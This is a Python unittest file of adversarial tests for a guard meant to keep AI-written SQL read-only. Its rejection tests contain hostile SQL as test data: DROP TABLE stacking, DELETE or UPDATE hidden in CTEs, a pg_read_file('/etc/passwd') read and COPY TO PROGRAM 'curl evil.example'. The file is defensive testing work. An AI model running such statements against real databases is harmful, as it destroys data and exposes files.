"""Adversarial tests for the read-only SQL guard.

This is the only thing between model-authored SQL and an Aurora role that can
write, so the tests here are written as attacks rather than as examples. Run:

    cd agents/_shared && ../../.venv-synth/bin/python -m unittest test_sql_guard
"""

from __future__ import annotations

import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from _shared.sql_guard import (  # noqa: E402
    REJECTION,
    check_read_only,
    read_only_error,
    strip_literals_and_comments,
)


def allowed(sql: str) -> bool:
    return check_read_only(sql)[0]


class AcceptsRealQueries(unittest.TestCase):
    """Every one of these appears in a shipped agent's system prompt as an
    example the model is told to imitate. If the guard rejects one of them the
    tool is broken for its actual users, so they are as load-bearing as the
    attacks below."""

    def test_plain_select(self):
        self.assertTrue(allowed("SELECT p.name FROM people p LIMIT 10"))

    def test_leading_whitespace_and_newlines(self):
        self.assertTrue(allowed("\n   SELECT 1\n"))

    def test_lowercase(self):
        self.assertTrue(allowed("select name from people"))

    def test_trailing_semicolon_is_fine(self):
        self.assertTrue(allowed("SELECT name FROM people;"))
        self.assertTrue(allowed("SELECT name FROM people;   \n"))

    def test_read_only_cte(self):
        self.assertTrue(
            allowed(
                "WITH top AS (SELECT person_id, weight FROM person_skills "
                "ORDER BY weight DESC LIMIT 5) "
                "SELECT p.name FROM top JOIN people p ON p.id = top.person_id"
            )
        )

    def test_correlated_subquery_from_the_advisor_prompt(self):
        self.assertTrue(
            allowed(
                "SELECT t.name FROM teams t WHERE NOT EXISTS ("
                "  SELECT 1 FROM team_memberships tm"
                "  JOIN person_skills ps ON ps.person_id = tm.person_id"
                "  JOIN skills s ON s.id = ps.skill_id"
                "  WHERE tm.team_id = t.id AND LOWER(s.name) LIKE '%ml%')"
            )
        )

    def test_column_names_that_merely_contain_a_write_verb(self):
        # `updated_at`, `created_at` and `OFFSET` must not trip the word-boundary
        # scan — an over-eager guard that rejects these is indistinguishable
        # from a broken tool.
        self.assertTrue(
            allowed(
                "SELECT id, created_at, updated_at, deleted_flag FROM people "
                "ORDER BY updated_at DESC LIMIT 10 OFFSET 20"
            )
        )

    def test_write_verb_inside_a_string_literal_is_data_not_code(self):
        self.assertTrue(allowed("SELECT id FROM people WHERE title = 'Update Manager'"))
        self.assertTrue(allowed("SELECT id FROM people WHERE bio LIKE '%drop table%'"))

    def test_escaped_quote_inside_a_literal(self):
        self.assertTrue(allowed("SELECT id FROM people WHERE name = 'O''Brien'"))

    def test_quoted_identifier(self):
        self.assertTrue(allowed('SELECT "select" FROM people'))


class RejectsWrites(unittest.TestCase):
    def test_bare_delete(self):
        self.assertFalse(allowed("DELETE FROM people"))

    def test_bare_update(self):
        self.assertFalse(allowed("UPDATE people SET name = 'x'"))

    def test_stacked_statement(self):
        ok, reason = check_read_only("SELECT 1; DROP TABLE people")
        self.assertFalse(ok)
        self.assertIn("one statement", reason)

    def test_stacked_statement_with_trailing_semicolon(self):
        self.assertFalse(allowed("SELECT 1; DROP TABLE people;"))

    def test_data_modifying_cte_delete(self):
        # THE regression this module exists for. PostgreSQL executes the DELETE
        # in the CTE; the statement starts with WITH and holds no semicolon, so
        # the old `^\s*(WITH|SELECT)\b` guard ran it.
        ok, reason = check_read_only(
            "WITH gone AS (DELETE FROM people RETURNING *) SELECT * FROM gone"
        )
        self.assertFalse(ok)
        self.assertIn("DELETE", reason)

    def test_data_modifying_cte_update(self):
        self.assertFalse(
            allowed(
                "WITH bumped AS (UPDATE people SET expertise_score = 1.0 RETURNING id) "
                "SELECT count(*) FROM bumped"
            )
        )

    def test_data_modifying_cte_insert(self):
        self.assertFalse(
            allowed(
                "WITH added AS (INSERT INTO people (id, name) VALUES ('x','X') "
                "RETURNING id) SELECT * FROM added"
            )
        )

    def test_select_into_creates_a_table(self):
        # `SELECT * INTO evil FROM people` is CREATE TABLE AS in disguise.
        self.assertFalse(allowed("SELECT * INTO evil FROM people"))

    def test_comment_prefixed_write_does_not_lead_with_select(self):
        self.assertFalse(allowed("-- SELECT 1\nDELETE FROM people"))

    def test_write_hidden_behind_a_block_comment_prefix(self):
        self.assertFalse(allowed("/* SELECT */ DELETE FROM people"))

    def test_write_hidden_inside_a_comment_after_a_select(self):
        # The keyword is only a comment, so this is NOT a write — but it also
        # must not be *smuggled*: stripping happens before the scan, so the
        # statement is judged on what the engine would actually execute.
        self.assertTrue(allowed("SELECT id FROM people -- DELETE FROM people"))

    def test_semicolon_hidden_in_a_comment_is_not_a_second_statement(self):
        self.assertTrue(allowed("SELECT id FROM people /* ; */"))

    def test_do_block(self):
        self.assertFalse(allowed("DO $$ BEGIN DELETE FROM people; END $$"))

    def test_pg_sleep_denial_of_service(self):
        self.assertFalse(allowed("SELECT pg_sleep(300)"))

    def test_file_read_via_pg_read_file(self):
        self.assertFalse(allowed("SELECT pg_read_file('/etc/passwd')"))

    def test_sequence_mutation(self):
        self.assertFalse(allowed("SELECT setval('people_seq', 1)"))

    def test_copy_to_program(self):
        self.assertFalse(allowed("COPY people TO PROGRAM 'curl evil.example'"))

    def test_grant(self):
        self.assertFalse(allowed("GRANT ALL ON people TO PUBLIC"))

    def test_unterminated_quote_is_refused_rather_than_guessed(self):
        ok, reason = check_read_only("SELECT * FROM people WHERE name = 'oops")
        self.assertFalse(ok)
        self.assertIn("unterminated", reason)

    def test_unterminated_block_comment_is_refused(self):
        ok, reason = check_read_only("SELECT 1 /* never closes")
        self.assertFalse(ok)
        self.assertIn("unterminated", reason)

    def test_empty_and_non_string(self):
        self.assertFalse(allowed(""))
        self.assertFalse(allowed("   \n "))
        self.assertFalse(check_read_only(None)[0])
        self.assertFalse(check_read_only({"sql": "SELECT 1"})[0])


class StripperTests(unittest.TestCase):
    def test_stripping_preserves_length(self):
        # Offsets must survive so `^\s*(WITH|SELECT)` still anchors correctly
        # and two keywords are never glued into one token by the removal.
        for sql in (
            "SELECT 'abc' FROM t -- trailing\n WHERE x = 1",
            "SELECT /* mid */ 1",
            "SELECT $$ body $$",
            "SELECT \"quoted ident\" FROM t",
        ):
            self.assertEqual(len(strip_literals_and_comments(sql)), len(sql), sql)

    def test_nested_block_comments(self):
        self.assertTrue(allowed("SELECT 1 /* a /* b */ c */"))

    def test_backslash_does_not_extend_a_literal(self):
        # standard_conforming_strings is on in PostgreSQL, so the backslash is
        # an ordinary character and the literal ends at the next quote. A
        # stripper that treated \' as an escape would mis-parse the rest of the
        # statement and could be walked past the guard.
        sql = r"SELECT id FROM people WHERE name = 'a\' AND 1=1"
        self.assertEqual(len(strip_literals_and_comments(sql)), len(sql))


class ErrorMessageTests(unittest.TestCase):
    def test_error_helper_returns_none_when_allowed(self):
        self.assertIsNone(read_only_error("SELECT 1"))

    def test_error_helper_keeps_the_original_message_prefix(self):
        # The tools return this string to the model verbatim; changing it
        # changes what the model sees and retries with.
        msg = read_only_error("DELETE FROM people")
        self.assertIsNotNone(msg)
        self.assertTrue(msg.startswith(REJECTION))
        self.assertIn("begin with SELECT or WITH", msg)


if __name__ == "__main__":
    unittest.main(verbosity=2)
